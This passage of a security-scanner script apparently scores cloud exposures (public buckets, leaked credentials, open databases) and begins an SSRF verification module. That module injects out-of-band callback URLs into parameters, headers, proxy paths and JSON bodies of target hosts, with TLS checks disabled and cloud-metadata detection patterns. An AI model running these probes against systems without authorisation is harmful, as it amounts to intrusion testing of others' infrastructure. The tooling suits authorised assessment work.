        #  Module L6 capec_attack_paths, which now reads these seed files.)
    fi

    # 6. Phase 3 — authenticated compliance audit (off unless creds supplied).
    log_info "Cloud compliance audit (authenticated)..."
    _cloud_compliance_audit "$compliance_file"

    # 7. Weighted scoring model.
    log_info "Scoring cloud findings (severity x exploitability x exposure)..."
    python3 - "$MANIFEST_FILE" "$nuclei_out" "$email_file" "$origin_file" "$cred_file" \
        "$OUTPUT_DIR/14_port_scan/all_ports_list.txt" "$findings_file" "$base_dir/cloud_summary.json" \
        "$buckets_file" << 'CLOUDSCORE_EOF'
import sys, os, json

(manifest_file, nuclei_file, email_file, origin_file, cred_file, ports_file,
 out_file, summary_file, buckets_file) = sys.argv[1:10]

BASE_WEIGHT = {
    "public_cloud_storage": 100, "public_kubernetes_api": 100,
    "metadata_service_exposure": 100, "leaked_cloud_credentials": 100,
    "terraform_state_exposed": 95, "public_elasticsearch": 95,
    "public_cicd": 90, "public_redis_mongo": 90,
    "grafana_prometheus_exposed": 80, "cdn_origin_bypass": 60,
    "missing_waf": 40, "missing_email_auth": 25,
    "debug_endpoint": 20, "information_disclosure": 15,
}
LABEL = {
    "public_cloud_storage": "Public cloud storage",
    "public_kubernetes_api": "Public Kubernetes API",
    "metadata_service_exposure": "Metadata service exposure",
    "leaked_cloud_credentials": "Leaked cloud credentials",
    "terraform_state_exposed": "Exposed Terraform state",
    "public_elasticsearch": "Public Elasticsearch/OpenSearch",
    "public_cicd": "Public Jenkins/CI-CD",
    "public_redis_mongo": "Public Redis/MongoDB",
    "grafana_prometheus_exposed": "Exposed Grafana/Prometheus",
    "cdn_origin_bypass": "CDN origin bypass",
    "missing_waf": "Missing WAF",
    "missing_email_auth": "Missing SPF/DKIM/DMARC",
    "debug_endpoint": "Debug endpoint",
    "information_disclosure": "Information disclosure",
}
REMEDIATION = {
    "public_cloud_storage": "Disable public bucket ACLs; enforce Block Public Access and least-privilege IAM.",
    "public_kubernetes_api": "Require authN/authZ on the API server and kubelet; restrict by network policy/firewall.",
    "metadata_service_exposure": "Enforce IMDSv2, block egress to 169.254.169.254, and fix the SSRF/proxy allowing relay.",
    "leaked_cloud_credentials": "Rotate the credential immediately, review CloudTrail/audit logs, and remove it from client code.",
    "terraform_state_exposed": "Remove the state file from the web root; store state in an access-controlled backend.",
    "public_elasticsearch": "Enable authentication and TLS; bind to private networks only.",
    "public_cicd": "Require SSO/authentication, disable anonymous access, and restrict network reachability.",
    "public_redis_mongo": "Enable authentication, bind to localhost/private nets, and firewall the port.",
    "grafana_prometheus_exposed": "Disable anonymous access, require login, and place behind authenticated proxy.",
    "cdn_origin_bypass": "Restrict origin to CDN/WAF egress IP ranges (ACL/security group/mTLS).",
    "missing_waf": "Place internet-facing web apps behind a WAF/CDN with rules enabled.",
    "missing_email_auth": "Publish SPF, DKIM, and a DMARC policy of quarantine or reject.",
    "debug_endpoint": "Disable debug/introspection endpoints in production or require authentication.",
    "information_disclosure": "Remove exposed internal information and restrict access.",
}

def sev_from_score(s):
    if s >= 90: return "critical"
    if s >= 60: return "high"
    if s >= 30: return "medium"
    if s >= 10: return "low"
    return "info"

def classify(tid, name, tags, arise_cat):
    if arise_cat and arise_cat in BASE_WEIGHT:
        return arise_cat
    blob = " ".join([tid or "", name or "", " ".join(tags or [])]).lower()
    rules = [
        (("s3", "bucket", "gcs", "google-storage", "azure-blob", "blob-container", "object-storage"), "public_cloud_storage"),
        (("kubernetes", "kubelet", "kube-", "k8s", "etcd", "kubeconfig", "kube-api"), "public_kubernetes_api"),
        (("metadata", "instance-metadata", "imds"), "metadata_service_exposure"),
        (("terraform", "tfstate"), "terraform_state_exposed"),
        (("elasticsearch", "opensearch", "kibana"), "public_elasticsearch"),
        (("jenkins", "gitlab", "teamcity", "argocd", "drone", "circleci", "bamboo", "gocd", "concourse"), "public_cicd"),
        (("redis", "mongodb", "mongo", "memcached", "couchdb", "cassandra"), "public_redis_mongo"),
        (("grafana", "prometheus", "alertmanager", "node-exporter"), "grafana_prometheus_exposed"),
        (("actuator", "phpinfo", "werkzeug", "debug", "expvar", "heapdump"), "debug_endpoint"),
    ]
    for kws, cat in rules:
        if any(k in blob for k in kws):
            return cat
    if "ssrf" in blob and "metadata" in blob:
        return "metadata_service_exposure"
    if any(k in blob for k in ("disclosure", "exposure", "exposed", "leak")):
        return "information_disclosure"
    return None

manifest = {}
if os.path.exists(manifest_file):
    try:
        manifest = json.load(open(manifest_file))
    except Exception:
        manifest = {}
hosts_meta = manifest.get("hosts", {})

def host_exposure(host):
    hd = hosts_meta.get(host, {})
    waf = (hd.get("waf_vendor") or "none").lower()
    if waf not in ("none", ""):
        return 0.6, "behind_waf"
    if hd.get("cdn"):
        return 0.85, "behind_cdn"
    return 1.0, "direct"

def host_from_url(u):
    try:
        return u.split("//")[1].split("/")[0].split(":")[0]
    except Exception:
        return u

findings = []
seen_host_cat = set()

def add(cat, host, url, expl, tool, template, evidence, nuclei_sev=None,
        exposure_override=None, severity_override=None, remediation_override=None):
    exposure, note = host_exposure(host)
    if exposure_override is not None:
        exposure, note = exposure_override
    base = BASE_WEIGHT[cat]
    score = round(min(base * expl * exposure, 100.0), 1)
    findings.append({
        "cloud_category": cat, "category_label": LABEL[cat],
        "source": "Cloud Exposure", "tool": tool,
        "template": template, "host": host or "Unknown", "url": url,
        # A caller that has already classified severity (e.g. cloud_storage_enum
        # content grading) can override the score-derived label so an open
        # image bucket stays low and a public DB dump stays critical.
        "severity": (severity_override or sev_from_score(score)),
        "nuclei_severity": nuclei_sev,
        "base_weight": base, "exploitability": round(expl, 2),
        "exposure": round(exposure, 2), "exposure_note": note,
        "weighted_score": score, "evidence": (evidence or "")[:220],
        "remediation": remediation_override or REMEDIATION[cat],
    })

# ---- nuclei findings ----
if os.path.exists(nuclei_file):
    for line in open(nuclei_file, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
        except Exception:
            continue
        info = d.get("info", {})
        tid = d.get("template-id", "")
        name = info.get("name", "")
        tags = info.get("tags", [])
        if isinstance(tags, str):
            tags = [t.strip() for t in tags.split(",")]
        arise_cat = (info.get("metadata") or {}).get("arise-category")
        cat = classify(tid, name, tags, arise_cat)
        if not cat:
            continue
        sev = (info.get("severity", "info") or "info").lower()
        url = d.get("matched-at") or d.get("url") or d.get("host", "")
        host = host_from_url(d.get("host") or url)
        extracted = d.get("extracted-results") or []
        # The reflected-input FP filter (evidence/nuclei_fp_filter.py) already
        # ran above and demoted info.severity for a finding whose only
        # textual evidence was the probe's own URL echoed back — surface that
        # verdict here too (severity_override) instead of letting the
        # score formula re-derive a non-"info" label from the demoted
        # severity alone (sev="info" without this would still land "low"
        # via expl=0.5, understating that this is a VERIFIED false positive,
        # not merely lower-confidence).
        fp_check = d.get("arise_fp_check") or {}
        sev_override = "info" if fp_check.get("reflected_input_fp") else None
        if sev in ("critical", "high") or extracted:
            expl = 1.0
        elif sev == "medium":
            expl = 0.7
        else:
            expl = 0.5
        evidence = ", ".join(extracted) if isinstance(extracted, list) else str(extracted)
        if fp_check.get("reflected_input_fp"):
            evidence = fp_check.get("reason", evidence)
        add(cat, host, url, expl, "nuclei", name or tid, evidence, nuclei_sev=sev,
            severity_override=sev_override)
        seen_host_cat.add((host, cat))

# ---- port-scan inference (indicator only: exploitability 0.4) ----
PORT_CAT = {
    9200: "public_elasticsearch", 9300: "public_elasticsearch", 5601: "public_elasticsearch",
    6379: "public_redis_mongo", 27017: "public_redis_mongo", 27018: "public_redis_mongo",
    11211: "public_redis_mongo", 5984: "public_redis_mongo",
    6443: "public_kubernetes_api", 10250: "public_kubernetes_api", 2379: "public_kubernetes_api",
    9090: "grafana_prometheus_exposed", 3000: "grafana_prometheus_exposed",
}
if os.path.exists(ports_file):
    for line in open(ports_file, errors="ignore"):
        line = line.strip()
        if not line or ":" not in line:
            continue
        host, _, port = line.rpartition(":")
        try:
            port = int(port)
        except ValueError:
            continue
        cat = PORT_CAT.get(port)
        if not cat or (host, cat) in seen_host_cat:
            continue
        seen_host_cat.add((host, cat))
        add(cat, host, "%s:%d" % (host, port), 0.4, "naabu",
            "Open %d/tcp" % port, "port %d open (service/auth unconfirmed)" % port,
            exposure_override=(1.0, "direct"))

# ---- email authentication ----
apex = manifest.get("pipeline_info", {}).get("target", "")
if os.path.exists(email_file):
    try:
        ea = json.load(open(email_file))
    except Exception:
        ea = {}
    if ea:
        gaps = []
        if not ea.get("spf_present"):
            gaps.append("no SPF")
        if not ea.get("dmarc_present"):
            gaps.append("no DMARC")
        elif ea.get("dmarc_policy", "none").lower() == "none":
            gaps.append("DMARC p=none (monitor only)")
        if not ea.get("dkim_present"):
            gaps.append("no DKIM selector found")
        if gaps:
            add("missing_email_auth", apex, apex, 0.5, "dig",
                "Email authentication gaps", "; ".join(gaps),
                exposure_override=(1.0, "domain"))

# ---- origin bypass ----
if os.path.exists(origin_file):
    for line in open(origin_file, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
        except Exception:
            continue
        host = o.get("host", "")
        add("cdn_origin_bypass", host, "https://%s (origin %s)" % (host, o.get("origin_ip", "")),
            0.7, "arise", "Origin reachable directly",
            "origin IP %s serves the app directly, bypassing CDN/WAF" % o.get("origin_ip", ""),
            exposure_override=(0.85, "origin_reachable"))

# ---- leaked cloud credentials ----
if os.path.exists(cred_file):
    cred_seen = set()
    # cloud_cred_scan.py's CredFinding only records the staged filename
    # (source_file — a bare basename, e.g. "app.min.js" or a sha1-hashed
    # 2xx-body name), never a URL. Reverse-map it back to the real source
    # page via the two index.tsv manifests Module 10 wrote when it staged
    # this same corpus for trufflehog, so host/url attribution is accurate
    # instead of silently collapsing every finding onto the apex domain.
    # cred_file == <OUTPUT_DIR>/17_cloud_exposure/cloud_credentials.jsonl —
    # OUTPUT_DIR itself isn't one of this script's argv, so derive it rather
    # than add a new positional arg to the sys.argv[1:10] contract above.
    _scan_out_dir = os.path.dirname(os.path.dirname(cred_file))
    cred_url_map = {}
    for idx_path in (
        os.path.join(_scan_out_dir, "10_secret_scanning", "staged", "js_downloads", "index.tsv"),
        os.path.join(_scan_out_dir, "10_secret_scanning", "staged", "http_responses_2xx", "index.tsv"),
    ):
        if os.path.exists(idx_path):
            for idx_line in open(idx_path, errors="ignore"):
                parts = idx_line.rstrip("\n").split("\t")
                if len(parts) == 2:
                    cred_url_map[parts[1]] = parts[0]
    for line in open(cred_file, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            c = json.loads(line)
        except Exception:
            continue
        det = c.get("detector", "credential")
        masked = c.get("masked", "")
        src_file = os.path.basename(c.get("source_file", ""))
        key = (det, src_file, masked)
        if key in cred_seen:
            continue
        cred_seen.add(key)
        # Prefer the resolved web source URL over the bare staged filename.
        src_url = cred_url_map.get(src_file, "")
        # F03 (ARISE_REMEDIATION_ROADMAP.md): a fabricated finding traced
        # this session had a source_file that existed nowhere in that scan's
        # own crawled corpus, yet this fold used to silently attribute it to
        # the apex domain as if confirmed there — looking authoritative for
        # data that couldn't be verified as belonging to this scan at all.
        # cloud-credential-artifact hits (.publishsettings/tfstate/etc) never
        # have a URL in cloud_cred_scan.py's own model, so apex is genuinely
        # the best available attribution for those, not a gap being papered
        # over; anything else with no index.tsv match is unverifiable.
        is_artifact = det == "cloud-credential-artifact"
        if src_url:
            display_url, cred_host, unattributed = src_url, host_from_url(src_url), False
        elif is_artifact:
            display_url, cred_host, unattributed = src_file, apex, False
        else:
            display_url, cred_host, unattributed = src_file, apex, True
        note = ("%s in %s (%s)" % (det, (src_url or src_file or "served asset"), masked))
        if unattributed:
            note += " [UNVERIFIED SOURCE — not found in this scan's own crawled corpus]"
        sev = c.get("severity") or None
        if unattributed and (sev or "").lower() in ("critical", "high"):
            sev = "medium"  # don't let an unverifiable source keep top severity
        add("leaked_cloud_credentials", cred_host, display_url,
            0.3 if unattributed else 1.0,
            "cloud_cred_scan", det, note,
            exposure_override=(1.0, "public_asset"),
            # Preserve the detector's own severity (e.g. AWS secret key =
            # critical vs a generic bearer JWT = medium) instead of letting
            # every credential type collapse onto one category-wide score.
            severity_override=sev)

# ---- Phase 2: enumerated storage buckets (cloud/cloud_storage_enum.py) ----
# The enumerator has already verified access AND graded each bucket by content
# (images->low, db/config/creds->critical, 403 access-denied->low). We honor
# that classification directly instead of re-deriving severity, so a public
# marketing-image bucket is not reported at the same level as a public DB dump.
if os.path.exists(buckets_file):
    bkt_seen = set()
    for line in open(buckets_file, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            b = json.loads(line)
        except Exception:
            continue
        name = b.get("name", "")
        access = (b.get("access") or "unknown").lower()
        # public   = listable exposure
        # forbidden= access-denied recon (low)
        # unclaimed= referenced-but-nonexistent name -> takeover vector
        # Anything else (private/not-found brute miss) is never emitted.
        if not name or access not in ("public", "forbidden", "open", "listable", "unclaimed"):
            continue
        key = (name, b.get("provider", ""))
        if key in bkt_seen:
            continue
        bkt_seen.add(key)
        sev = (b.get("severity") or "").lower() or None
        risk = b.get("risk_score")
        files = b.get("files", b.get("data_count", 0)) or 0
        # exploitability tracks classified risk so weighted_score stays coherent
        # with the overridden label; fall back to the old heuristic if unscored.
        expl = risk if isinstance(risk, (int, float)) else (1.0 if files else 0.85)
        if access == "unclaimed":
            template = "Unclaimed storage reference (NoSuchBucket — verify ownership)"
        elif access in ("public", "open", "listable"):
            template = "Public storage bucket"
        else:
            template = "Cloud bucket (access denied)"
        evidence = b.get("evidence") or ("%s bucket '%s' (%s)"
                                         % (b.get("provider", "aws").upper(), name, access))
        # W5: exposure weight tracks the W1 exposure_state ladder — a merely
        # 'referenced' (unclaimed) or 'exists' (403 access-denied) signal must
        # not be weighted like a live 'anon_accessible'/'sensitive_confirmed'
        # exposure, so recon-only findings stop inflating the cloud score.
        _state = (b.get("exposure_state") or "").lower()
        _exp = {"referenced": 0.3, "exists": 0.4,
                "anon_accessible": 1.0, "sensitive_confirmed": 1.0}.get(_state, 1.0)
        add("public_cloud_storage", name, b.get("url", name), expl,
            "cloud_storage_enum", template, evidence,
            exposure_override=(_exp, "public_internet"),
            severity_override=sev,
            remediation_override=b.get("remediation"))

# ---- missing WAF (control gap; cap to limit noise) ----
def waf_gap_exploitability(hd):
    # F13 (ARISE_REMEDIATION_ROADMAP.md): this used to be a flat 0.4 constant
    # for every host, so a live public web app and a bare 403 shell scored
    # identically. Derive it from the same per-host signal already present in
    # manifest.json's hosts{} (no new data collection needed) so the score
    # actually reflects what's undefended, not just that the flag is set.
    score = 0.25
    if hd.get("has_webapp"):
        score += 0.15  # confirmed live app, not just an open port
    status = hd.get("http_status")
    if isinstance(status, int) and 200 <= status < 400:
        score += 0.15  # publicly serving content, not access-gated
    elif isinstance(status, int) and status in (401, 403):
        score -= 0.05  # already gated at the app layer
    if hd.get("catchall_detected") or hd.get("js_challenge_detected"):
        score -= 0.05  # some bot/challenge friction even without a named WAF vendor
    return max(0.15, min(round(score, 2), 0.6))

missing_waf = []
for host, hd in hosts_meta.items():
    if not hd.get("http_status"):
        continue
    waf = (hd.get("waf_vendor") or "none").lower()
    if waf in ("none", "") and not hd.get("cdn"):
        missing_waf.append(host)
for host in missing_waf[:50]:
    hd = hosts_meta.get(host, {})
    add("missing_waf", host, "https://%s" % host, waf_gap_exploitability(hd), "arise",
        "No WAF/CDN in front of web app", "internet-facing host without WAF or CDN")

# ---- write outputs ----
findings.sort(key=lambda x: x["weighted_score"], reverse=True)
with open(out_file, "w") as w:
    for f in findings:
        w.write(json.dumps(f) + "\n")

by_cat = {}
for f in findings:
    c = f["cloud_category"]
    by_cat.setdefault(c, {"label": LABEL[c], "count": 0, "max_score": 0})
    by_cat[c]["count"] += 1
    by_cat[c]["max_score"] = max(by_cat[c]["max_score"], f["weighted_score"])

sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
for f in findings:
    sev_counts[f["severity"]] = sev_counts.get(f["severity"], 0) + 1

summary = {
    "total_findings": len(findings),
    "by_category": by_cat,
    "by_severity": sev_counts,
    "top_finding_score": findings[0]["weighted_score"] if findings else 0,
}
json.dump(summary, open(summary_file, "w"), indent=2)
print(len(findings))
CLOUDSCORE_EOF

    local total=$(count_lines "$findings_file")
    log_info "Cloud attack surface findings: $total (scored)"
    if [ "$total" -gt 0 ]; then
        log_info "Top cloud exposures:"
        head -5 "$findings_file" | jq -r '"  [\(.weighted_score)] \(.category_label) - \(.host) (\(.severity))"' 2>/dev/null || true
    fi

    update_statistics "cloud_findings" "$total"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "cloud_exposure",
  "cloud_findings": $total,
  "nuclei_findings": $(count_lines "$nuclei_out"),
  "buckets_enumerated": $(count_lines "$buckets_file"),
  "compliance_findings": $(count_lines "$compliance_file"),
  "findings_file": "cloud_findings.jsonl",
  "buckets_file": "cloud_buckets.jsonl",
  "compliance_file": "cloud_compliance.jsonl",
  "summary_file": "cloud_summary.json",
  "duration_seconds": $((end_time - start_time))
}
EOF

    log_info "Cloud attack surface exposure completed"
    echo "$output_file"
}

###################################################################################################
# MODULE 19: EXTENDED VULNERABILITY VERIFICATION (production-safe: confirm, never exploit)
###################################################################################################

# Collect candidate URLs that carry query parameters, from crawling + param
# fuzzing. SAFE: we only keep GET-style URLs and cap the count.
_ext_collect_param_urls() {
    local out="$1"
    : > "$out"
    local sources=(
        "$OUTPUT_DIR/09_crawling/all_urls.txt"
        "$OUTPUT_DIR/11_param_fuzzing/param_urls.txt"
        "$OUTPUT_DIR/11_param_fuzzing/urls_with_params.txt"
        "$OUTPUT_DIR/01_asset_discovery/gau_urls.txt"
    )
    # Collect all parameterized URLs, filter junk, then dedup by base path
    # so the 150-URL cap gets diverse endpoints rather than 150 variants of
    # the same page with different ID values.
    local raw_tmp; raw_tmp=$(mktemp)
    for s in "${sources[@]}"; do
        [ -f "$s" ] && grep -E '\?[^=]+=' "$s" 2>/dev/null
    done | grep -Ev '\.(png|jpe?g|gif|svg|css|woff2?|ttf|ico|webp|mp4|pdf)(\?|$)' \
         | grep -Ev '(/static/|/assets/|/fonts/|/img/|/_next/image|\.cdn\.)' \
         | sort -u > "$raw_tmp"
    # Dedup: keep one URL per unique (host + path + param-name-set)
    python3 - "$raw_tmp" "$out" "$EXTENDED_MAX_URLS" << 'DEDUP'
import sys
from urllib.parse import urlsplit, parse_qs
raw, out, cap = sys.argv[1], sys.argv[2], int(sys.argv[3])
seen = set()
results = []
for line in open(raw, errors="ignore"):
    u = line.strip()
    if not u:
        continue
    try:
        p = urlsplit(u)
        params = sorted(parse_qs(p.query, keep_blank_values=True).keys())
        key = (p.netloc, p.path, tuple(params))
    except Exception:
        continue
    if key not in seen:
        seen.add(key)
        results.append(u)
        if len(results) >= cap:
            break
with open(out, "w") as f:
    f.write("\n".join(results) + "\n" if results else "")
DEDUP
    rm -f "$raw_tmp"
    count_lines "$out"
}

# Collect ALL live URLs (not just parameterized) for checks that inject into
# headers/body (CRLF, smuggling) or need any reachable endpoint (SSTI --forms).
_ext_collect_all_urls() {
    local out="$1"
    : > "$out"
    local sources=(
        "$OUTPUT_DIR/09_crawling/all_urls.txt"
        "$OUTPUT_DIR/04_http_discovery/http_urls.txt"
        "$OUTPUT_DIR/01_asset_discovery/gau_urls.txt"
    )
    local raw_tmp; raw_tmp=$(mktemp)
    for s in "${sources[@]}"; do
        [ -f "$s" ] && cat "$s" 2>/dev/null
    done | grep -E '^https?://' \
         | grep -Ev '\.(png|jpe?g|gif|svg|css|woff2?|ttf|ico|webp|mp4|pdf|js|json)(\?|$|#)' \
         | grep -Ev '(/static/|/assets/|/fonts/|/img/|/_next/image|\.cdn\.)' \
         | sort -u > "$raw_tmp"
    # Dedup by host+path
    python3 - "$raw_tmp" "$out" "$EXTENDED_MAX_URLS" << 'DEDUP2'
import sys
from urllib.parse import urlsplit
raw, out, cap = sys.argv[1], sys.argv[2], int(sys.argv[3])
seen = set()
results = []
for line in open(raw, errors="ignore"):
    u = line.strip()
    if not u:
        continue
    try:
        p = urlsplit(u)
        key = (p.netloc, p.path)
    except Exception:
        continue
    if key not in seen:
        seen.add(key)
        results.append(u)
        if len(results) >= cap:
            break
with open(out, "w") as f:
    f.write("\n".join(results) + "\n" if results else "")
DEDUP2
    rm -f "$raw_tmp"
    count_lines "$out"
}

# Start the interactsh OOB oracle in the background. Prints the registered
# payload domain to stdout; callbacks stream as JSON into $2.
_ext_start_interactsh() {
    local domain_out="$1"
    local callbacks="$2"
    : > "$callbacks"; : > "$domain_out"
    command -v "$INTERACTSH_CLIENT" &>/dev/null || { log_warn "  interactsh-client not installed; blind-SSRF confirmation disabled"; return 1; }
    local server_arg=()
    [ -n "$INTERACTSH_SERVER" ] && server_arg=(-s "$INTERACTSH_SERVER")
    # -json streams callback records; -o persists them; -v keeps the domain line.
    "$INTERACTSH_CLIENT" "${server_arg[@]}" -json -o "$callbacks" > "$domain_out.raw" 2>&1 &
    INTERACTSH_PID=$!
    # The client prints the payload domain within the first couple seconds.
    local tries=0
    while [ $tries -lt 10 ]; do
        local dom
        dom=$(grep -oE '[a-z0-9]+\.oast\.[a-z]+' "$domain_out.raw" 2>/dev/null | head -1)
        [ -z "$dom" ] && dom=$(grep -oE '[a-z0-9]+\.[a-z0-9.-]*interact[a-z0-9.-]*' "$domain_out.raw" 2>/dev/null | head -1)
        if [ -n "$dom" ]; then echo "$dom" > "$domain_out"; return 0; fi
        sleep 1; tries=$((tries+1))
    done
    log_warn "  interactsh did not register a domain in time; SSRF confirmation degraded"
    # Kill the orphaned background process so it doesn't leak
    [ -n "$INTERACTSH_PID" ] && kill "$INTERACTSH_PID" 2>/dev/null
    INTERACTSH_PID=""
    return 1
}

_ext_stop_interactsh() {
    [ -n "$INTERACTSH_PID" ] && kill "$INTERACTSH_PID" 2>/dev/null
    INTERACTSH_PID=""
}

# SSRF (blind OOB + direct cloud-metadata). SAFE: injects interactsh URLs into
# SSRF-sink params (query, POST body, headers, path proxies); a callback proves
# the server made an outbound request. Also probes for direct cloud-metadata
# leaks (169.254.169.254) in responses. No internal resource is exploited —
# confirmation only. API POST body injection uses input_functions.jsonl from
# CDP discovery (Module 20.2).
_ext_ssrf() {
    local urls="$1" oob_domain="$2" probe_map="$3" out="$4" cap="${5:-600}"
    : > "$out"
    [ "$CHECK_SSRF" = "true" ] || { log_info "  SSRF check disabled"; return 0; }
    [ -s "$oob_domain" ] || { log_warn "  No OOB domain; skipping SSRF confirmation"; return 0; }
    local dom; dom=$(cat "$oob_domain")
    local input_funcs="$OUTPUT_DIR/20_api_deep_discovery/input_functions.jsonl"
    [ -f "$input_funcs" ] || input_funcs=""
    python3 - "$urls" "$dom" "$probe_map" "$EXTENDED_RATE" "$input_funcs" "$out" "$cap" << 'SSRFEOF'
import sys, urllib.parse, urllib.request, json, time, uuid, re, ssl, os

urls_file, oob, mapfile, rate = sys.argv[1:5]
input_funcs_file = sys.argv[5] if len(sys.argv) > 5 and sys.argv[5] else ""
direct_out = sys.argv[6] if len(sys.argv) > 6 else ""
CAP = int(sys.argv[7]) if len(sys.argv) > 7 else 600
delay = 1.0 / max(1, int(rate))

SINKS = {
    "url","uri","link","src","dest","destination","redirect","redirect_uri",
    "redirect_url","return_url","next","next_url","continue","continueto",
    "path","domain","host","feed","site","callback","webhook","proxy",
    "proxy_url","fetch","file","page","out","to","view","image","img",
    "load","ref","return","u","r","target","open","window","dataurl",
    "source","remote","endpoint","service","api","api_url","base_url",
    "forward","forward_to","goto","jump","navigation","resource",
    "content","data","reference","val","validate","request","download",
    "dir","show","navigation","returnto","go","returnurl","checkout_url",
    "continue_url","login_url","image_url","icon_url","logo","avatar",
    "preview","preview_url","pdf","pdf_url","html_url","share_url",
    "action_url","targeturl","origin","origin_url","ssrf","rurl","surl"
}

HEADER_SINKS = [
    ("X-Forwarded-For", "header-xff"),
    ("X-Original-URL", "header-xou"),
    ("Referer", "header-referer"),
    ("X-Forwarded-Host", "header-xfh"),
]

METADATA_MARKERS = [
    b"ami-id", b"instance-id", b"iam/security-credentials",
    b"meta-data/", b"computeMetadata", b"instance/compute",
    b"169.254.169.254", b"metadata.google.internal",
    b"metadata.azure", b'"accountId"', b'"accessKeyId"',
]

URL_VALUE_RX = re.compile(r'^https?://', re.I)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

probes = {}
sent = 0
direct_findings = []

def mktok():
    return uuid.uuid4().hex[:12]

def fire(url, headers=None, data=None, method="GET", timeout=8):
    hdrs = {"User-Agent": "ARISE-SafeVerify/1.0"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, headers=hdrs, data=data, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read(4096)
        return body
    except Exception:
        return None

def record(mf, token, orig_url, param, host, vector="query"):
    probes[token] = {"url": orig_url, "param": param, "host": host, "vector": vector}
    mf.write(json.dumps({"token": token, **probes[token]}) + "\n")

def check_metadata_leak(body, orig_url, param, host, vector):
    if not body:
        return
    for marker in METADATA_MARKERS:
        if marker in body:
            direct_findings.append({
                "check": "ssrf", "tool": "arise-ssrf", "severity": "critical",
                "template": "SSRF cloud metadata leak (direct response)",
                "host": host, "url": orig_url, "parameter": param,
                "evidence": "response contains cloud metadata marker: %s" % marker.decode(errors="replace"),
                "confidence": "confirmed", "verification": "response-content",
                "vector": vector,
                "remediation": "Block outbound requests to link-local/metadata IPs (169.254.169.254, metadata.google.internal); enforce IMDSv2; validate/allowlist user-supplied URLs.",
                "safe_mode": True
            })
            break

with open(mapfile, "w") as mf:

    # ── Phase 1: Query-param injection (expanded sink list + URL-like values) ──
    for line in open(urls_file, errors="ignore"):
        u = line.strip()
        if not u or sent >= CAP:
            break
        try:
            parts = urllib.parse.urlsplit(u)
            qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        except Exception:
            continue
        if not qs:
            continue
        for i, (k, v) in enumerate(qs):
            kl = k.lower()
            is_sink = kl in SINKS
            is_url_val = bool(URL_VALUE_RX.match(v))
            if not is_sink and not is_url_val:
                continue
            if sent >= CAP:
                break
            token = mktok()
            payload = "http://%s.%s" % (token, oob)
            newqs = qs[:i] + [(k, payload)] + qs[i+1:]
            probe_url = urllib.parse.urlunsplit((
                parts.scheme, parts.netloc, parts.path,
                urllib.parse.urlencode(newqs), parts.fragment))
            record(mf, token, u, k, parts.netloc, "query-param")
            body = fire(probe_url)
            check_metadata_leak(body, u, k, parts.netloc, "query-param")
            sent += 1
            time.sleep(delay)

    # ── Phase 2: Header injection (X-Forwarded-For, Referer, X-Original-URL) ──
    seen_hosts = set()
    for line in open(urls_file, errors="ignore"):
        u = line.strip()
        if not u or sent >= CAP:
            break
        try:
            parts = urllib.parse.urlsplit(u)
        except Exception:
            continue
        if parts.netloc in seen_hosts:
            continue
        seen_hosts.add(parts.netloc)
        base_url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, parts.query, ""))
        for hdr_name, vec_label in HEADER_SINKS:
            if sent >= CAP:
                break
            token = mktok()
            payload = "http://%s.%s" % (token, oob)
            record(mf, token, u, hdr_name, parts.netloc, vec_label)
            fire(base_url, headers={hdr_name: payload})
            sent += 1
            time.sleep(delay)

    # ── Phase 3: Path-based SSRF (proxy/redirect endpoints) ──
    PROXY_PATHS = ["/proxy", "/fetch", "/render", "/preview", "/screenshot",
                   "/url", "/redirect", "/forward", "/goto", "/load",
                   "/api/proxy", "/api/fetch", "/api/render", "/api/url",
                   "/api/v1/proxy", "/api/v1/fetch", "/api/v1/url"]
    seen_host_path = set()
    for line in open(urls_file, errors="ignore"):
        u = line.strip()
        if not u or sent >= CAP:
            break
        try:
            parts = urllib.parse.urlsplit(u)
        except Exception:
            continue
        host_key = parts.netloc
        if host_key in seen_host_path:
            continue
        seen_host_path.add(host_key)
        for pp in PROXY_PATHS:
            if sent >= CAP:
                break
            token = mktok()
            payload_url = "http://%s.%s" % (token, oob)
            probe_url = "%s://%s%s?url=%s" % (parts.scheme, parts.netloc, pp,
                                               urllib.parse.quote(payload_url, safe=""))
            record(mf, token, probe_url, "path-proxy", parts.netloc, "path-proxy")
            fire(probe_url)
            sent += 1
            time.sleep(delay)

    # ── Phase 4: POST body JSON injection (from input_functions.jsonl) ──
    if input_funcs_file and os.path.isfile(input_funcs_file):
        seen_api = set()
        for line in open(input_funcs_file, errors="ignore"):
            if sent >= CAP:
                break
            line = line.strip()
            if not line:
                continue
            try:
                rec = json.loads(line)
            except Exception:
                continue
            ep_url = rec.get("url", "")
            method = rec.get("method", "GET").upper()
            body_keys = rec.get("body_keys") or rec.get("params") or []
            ct = rec.get("content_type") or rec.get("enctype") or ""
            if method not in ("POST", "PUT", "PATCH"):
                continue
            if not body_keys:
                continue
            try:
                parts = urllib.parse.urlsplit(ep_url)
            except Exception:
                continue
            api_key = (parts.netloc, parts.path, method)
            if api_key in seen_api:
                continue
            seen_api.add(api_key)
            sink_keys = [k for k in body_keys if k.lower() in SINKS
                         or any(s in k.lower() for s in ("url","uri","link","src",
                                "dest","callback","webhook","proxy","fetch","endpoint",
                                "host","domain","path","redirect","forward","target",
                                "resource","image","avatar","logo","preview","pdf",
                                "origin","remote","service","api"))]
            if not sink_keys:
                continue
            for sk in sink_keys[:3]:
                if sent >= CAP:
                    break
                token = mktok()
                payload = "http://%s.%s" % (token, oob)
                body_dict = {k: "" for k in body_keys}
                body_dict[sk] = payload
                data = json.dumps(body_dict).encode()
                record(mf, token, ep_url, sk, parts.netloc, "post-body-json")
                body = fire(ep_url, headers={"Content-Type": "application/json"},
                            data=data, method=method)
                check_metadata_leak(body, ep_url, sk, parts.netloc, "post-body-json")
                sent += 1
                time.sleep(delay)

